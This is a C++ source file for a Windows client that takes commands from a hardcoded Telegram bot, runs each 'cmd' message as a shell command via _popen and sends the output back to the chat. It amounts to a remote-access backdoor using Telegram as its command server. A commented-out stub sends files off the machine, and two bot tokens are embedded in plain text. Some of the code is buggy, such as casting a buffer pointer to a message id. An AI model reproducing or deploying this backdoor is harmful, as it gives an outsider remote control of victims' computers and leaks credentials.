#include "Client.h"

//TgBot::Bot bot("1139152301:AAEd_ZL0oyhGHd7aMykZhRpOoa2-76fsuow");

Client::Client() {
	bot = make_unique<TgBot::Bot>("1221166615:AAGr7IUBGUcBPFLLZ8OYo1ZwwxZmzcRM2bM");
}

string Client::exec(string& cmd) {
	char buffer[128];
	std::string result = "";
	FILE* pipe = _popen(cmd.c_str(), "r");
	if (!pipe) {
		return "There is an error with the command " + cmd;
	}
	try {
		while (fgets(buffer, sizeof buffer, pipe) != NULL) {
			result += buffer;
		}
	}
	catch (...) {
		_pclose(pipe);
		return "There is an error with the command " + cmd;
	}
	_pclose(pipe);
	return result;
}

//Getting command from the server v
TgBot::Message::Ptr Client::getTGMessage(unique_ptr<TgBot::Bot> &bot) {
	TgBot::Message::Ptr msg;
	bot->getEvents().onAnyMessage([&](TgBot::Message::Ptr message) {
		//printf("User wrote %s\n", message->text.c_str());
		chatId = message->chat->id;
		msg = message;
		return msg;
		//bot->getApi().sendMessage(message->chat->id, message->text);
	});
	try {
		//printf("Bot username: %s\n", bot->getApi().getMe()->username.c_str());
		TgBot::TgLongPoll longPoll(*bot);
		longPoll.start();
		return msg;
	}
	catch (TgBot::TgException& e) {
		//printf("error: %s\n", e.what());
		return msg;
	}
	return msg;
}


//Sending command to the server via the bot
void Client::sendTGMessage(unique_ptr<TgBot::Bot>&bot, string message) {
	bot->getApi().sendMessage(chatId, message);
	return;
}



void Client::connection() {
	
	vector<char> buffer = vector<char>(100 + 1, 0);

	fstream file;
	file.open("C:\\Users\\Asaf\\Pictures\\test.txt", ios::ate);
	file.read(buffer.data(), 100);
	int64_t id1 = reinterpret_cast<int64_t>(buffer.data());
	cout << id1 << endl;
	//The command from the server
	TgBot::Message::Ptr command;

	//Checking if the last command is same as the new command
	string equalCommand;

	while (true) {
		std::cout << "Test" << endl;
		//ZeroMemory(buf, 1024);
		//bytesReceived = recv(sock, buf, 1024, 0);

		command = getTGMessage(bot);
		cout << "The message id is " << command->messageId << endl;

		if (id1 == command->messageId) {
			continue;
		}
		else {
			id1 = command->messageId;
			//file.trunc;
			file.write(reinterpret_cast<const char*>(id1) , sizeof(int64_t));
		}



		//There is a bug when disconnecting the camera (The program crash)

		if (!command->text.rfind("cmd ")) {
			//Deleting the first 4 (cmd ) characters from the command
			command->text = command->text.substr(4, command->text.size() - 1);
			string output;
			//Execute the command and saving the output in output
			try{
				string output = exec(command->text);
				//Send the results to the server
				sendTGMessage(bot, output);
			}
			catch (exception &e) {
				cout << "Cant run the command " + command->text << endl;
				cout << e.what();
			}
		}
		else if (command->text.rfind("quit") == 0) {
			sendTGMessage(bot, "quitting!");
			file.write(reinterpret_cast<const char*>(command->messageId), sizeof(int64_t));
			file.close();
			return;
		}
		//else if(command->text.rfind("send file") == 0){
			//bot->getApi().sendDocument
			//bot->getApi().sendDocument(chatId, "C:\\Users\\Asaf\\Pictures\\FLAMING MOUNTAIN.JPG");
		//}
		else {
			//The command is not exist
			string cantFind = "The command " + command->text + " was not found";
			sendTGMessage(bot, cantFind.c_str());
		}
	}
	std::cout << "End of the program" << endl;
	file.close();
}
